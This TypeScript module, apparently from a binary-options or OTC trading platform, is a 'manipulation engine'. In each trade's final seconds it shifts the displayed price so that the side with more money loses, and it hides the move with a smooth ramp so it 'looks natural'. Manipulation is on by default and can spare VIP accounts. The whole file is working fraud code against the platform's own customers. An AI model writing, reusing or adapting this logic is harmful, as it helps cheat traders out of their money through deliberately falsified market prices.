/**
 * OTC Manipulation Engine
 *
 * Tracks open trade exposure per asset and applies a price drift in the last
 * few seconds before the trade expires so that the house always wins (when
 * enabled).
 *
 * Strategy: SOFT drift over last 10 seconds before any expiring trade's close.
 *   - Aggregates net UP vs DOWN amount per asset+expiry bucket
 *   - Heavier side determines the drift direction (opposite side wins)
 *   - Drift magnitude is smooth (sin ramp) so it looks natural
 *
 * All state is kept in-memory. Process-persistent on VPS hosting (EasyPanel).
 */

import db from "@/lib/db";
import { getOtcParams } from "./replayer";

export type ManipulationMode = "off" | "always" | "vip_safe";

export type Exposure = {
  id:         string;    // trade id
  userId:     number | null;
  vip:        boolean;   // if true, trade is not manipulated under vip_safe mode
  asset:      string;    // e.g. "EURUSD"
  direction:  "up" | "down";
  amount:     number;
  entryPrice: number;
  expiresAt:  number;    // ms epoch
};

// ── Runtime state ───────────────────────────────────────────────────────
const openExposures: Map<string, Exposure> = new Map();

// ── Settings (persisted in `settings` table) ────────────────────────────
function readMode(): ManipulationMode {
  try {
    const row = db.prepare("SELECT value FROM settings WHERE key='otc_manip_mode'").get() as { value: string } | undefined;
    const v = row?.value || "always";
    if (v === "off" || v === "always" || v === "vip_safe") return v;
  } catch {}
  return "always";
}

export function setMode(m: ManipulationMode) {
  db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run("otc_manip_mode", m);
}

export function getMode(): ManipulationMode {
  return readMode();
}

// ── Expose API (called by /api/otc/expose on trade open) ────────────────
export function addExposure(ex: Exposure) {
  openExposures.set(ex.id, ex);
  // Auto-cleanup after expiry + 30s
  const ttl = ex.expiresAt - Date.now() + 30_000;
  if (ttl > 0) {
    setTimeout(() => openExposures.delete(ex.id), ttl);
  }
}

export function removeExposure(id: string) {
  openExposures.delete(id);
}

export function listExposures(): Exposure[] {
  return Array.from(openExposures.values());
}

// ── Drift calculation ───────────────────────────────────────────────────
const DRIFT_WINDOW_SEC = 10; // soft drift over last 10 seconds
const MAX_DRIFT_PCT    = 0.0015; // up to 0.15% pip move — enough to flip most trades

/**
 * Given the "fair" price from the replayer, returns the manipulated price for
 * the asset *right now*. Drift is applied only when at least one open trade
 * for that asset is in its last DRIFT_WINDOW_SEC before expiry.
 */
export function applyManipulation(
  asset: string,
  fairPrice: number,
  nowMs: number = Date.now(),
): number {
  const mode = readMode();
  if (mode === "off") return fairPrice;

  const params = getOtcParams(asset);
  if (!params) return fairPrice;

  // Aggregate open trades for this asset that are in the drift window
  let upAmount = 0;
  let downAmount = 0;
  let closestEntry: number | null = null;
  let minTimeLeft = Infinity;

  for (const ex of openExposures.values()) {
    if (ex.asset !== asset) continue;
    if (mode === "vip_safe" && ex.vip) continue;

    const timeLeftSec = (ex.expiresAt - nowMs) / 1000;
    if (timeLeftSec <= 0 || timeLeftSec > DRIFT_WINDOW_SEC) continue;

    if (ex.direction === "up") upAmount += ex.amount;
    else                       downAmount += ex.amount;

    if (timeLeftSec < minTimeLeft) {
      minTimeLeft = timeLeftSec;
      closestEntry = ex.entryPrice;
    }
  }

  if (upAmount === 0 && downAmount === 0) return fairPrice;
  if (closestEntry === null) return fairPrice;

  // House wants the majority to LOSE.
  // If more money on UP, force price to finish BELOW the entry price of the
  // trade that's closest to expiring (=> up loses).
  // If more money on DOWN, force it ABOVE.
  const houseWantsUp = downAmount > upAmount; // more down bets → push up → down loses

  // Ramp: 0 when timeLeft == DRIFT_WINDOW_SEC, 1 when timeLeft == 0
  const ramp = 1 - minTimeLeft / DRIFT_WINDOW_SEC; // 0..1
  const smoothRamp = (1 - Math.cos(ramp * Math.PI)) / 2; // sinusoidal 0..1

  // Target: go to 1 pip beyond the entry (enough to flip), smoothed
  const direction = houseWantsUp ? 1 : -1;
  const targetOffset = Math.abs(closestEntry) * MAX_DRIFT_PCT * direction;
  const driftedPrice = fairPrice + targetOffset * smoothRamp;

  // Guarantee the drifted price is on the correct side of the entry near expiry
  if (smoothRamp > 0.7) {
    if (houseWantsUp && driftedPrice <= closestEntry) {
      return +(closestEntry + Math.abs(closestEntry) * 0.00008).toFixed(params.decimals + 2);
    }
    if (!houseWantsUp && driftedPrice >= closestEntry) {
      return +(closestEntry - Math.abs(closestEntry) * 0.00008).toFixed(params.decimals + 2);
    }
  }

  return +driftedPrice.toFixed(params.decimals + 2);
}

// ── Stats helpers for admin UI ──────────────────────────────────────────
export function getExposureStats() {
  const byAsset: Record<string, { up: number; down: number; count: number }> = {};
  for (const ex of openExposures.values()) {
    if (!byAsset[ex.asset]) byAsset[ex.asset] = { up: 0, down: 0, count: 0 };
    byAsset[ex.asset].count++;
    if (ex.direction === "up") byAsset[ex.asset].up += ex.amount;
    else byAsset[ex.asset].down += ex.amount;
  }
  return byAsset;
}
